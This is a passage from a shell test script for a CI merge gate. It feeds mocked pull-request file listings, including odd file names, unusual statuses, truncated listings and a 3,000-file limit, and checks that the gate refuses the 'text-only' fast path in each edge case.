nto "a file name with a newline (bash and jq disagree on \$, G0 D-15)" "[$P,{\"filename\":\"README.md\\n\",\"status\":\"added\"}]" "$FILES"
nto "a file name with a control character under docs/" "[$P,{\"filename\":\"docs/a\\tb.md\",\"status\":\"added\"}]" "$FILES"
nto "status copied" "[$P,{\"filename\":\"docs/b.md\",\"status\":\"copied\"}]" "$FILES"
nto "status changed" "[$P,{\"filename\":\"docs/b.md\",\"status\":\"changed\"}]" "$FILES"
nto "a listing shorter than changedFiles (truncated)" "[$P,{\"filename\":\"docs/b.md\",\"status\":\"modified\"}]" '[{"path":"a"},{"path":"b"},{"path":"c"}]'
nto "a listing longer than changedFiles" "[$P,{\"filename\":\"docs/b.md\",\"status\":\"modified\"},{\"filename\":\"docs/c.md\",\"status\":\"modified\"}]" "$FILES"
nto "3,000 files" "$(jq -cn --argjson p "$P" '[$p] + [range(2999) | {filename:"docs/f\(.).md",status:"added"}]')" "$(jq -cn '[range(3000) | {path:"x"}]')"
nto "a file entry without a status" "[$P,{\"filename\":\"docs/b.md\"}]" "$FILES"
MARKER=skipped; text; touch "$MOCK_DIR/pr-files.json.fail"
refused "not text-only: a files API error" "took the fast path"
MARKER=skipped; text
expect_exit 1 "T-M2.23: not text-only: a missing allow-list" -- env CI_TEXT_ONLY_FILE="$MOCK_DIR/none" "$ROOT/scripts/merge-gate.sh" --dry-run 7
expect_output_contains "took the fast path" "T-M2.23: a missing allow-list: says why"
printf '# nothing\n' >"$MOCK_DIR/empty.paths"
expect_exit 1 "T-M2.23: not text-only: an allow-list without a pattern" -- env CI_TEXT_ONLY_FILE="$MOCK_DIR/empty.paths" "$ROOT/scripts/merge-gate.sh" --dry-run 7
MARKER=skipped; PRFILES=$(jq -cn --argjson p "$P" '[$p] + [range(2998) | {filename:"docs/f\(.).md",status:"added"}]')
write_fixture chore/T-M9.9-x develop CLEAN "$GOOD" "$(jq -cn '[range(2999) | {path:"x"}]')" "$ALL_CHECKS" 0
expect_exit 0 "T-M2.23: 2,999 text files are text-only (the 3,000 limit is the cause above)" -- gate --dry-run 7

finish
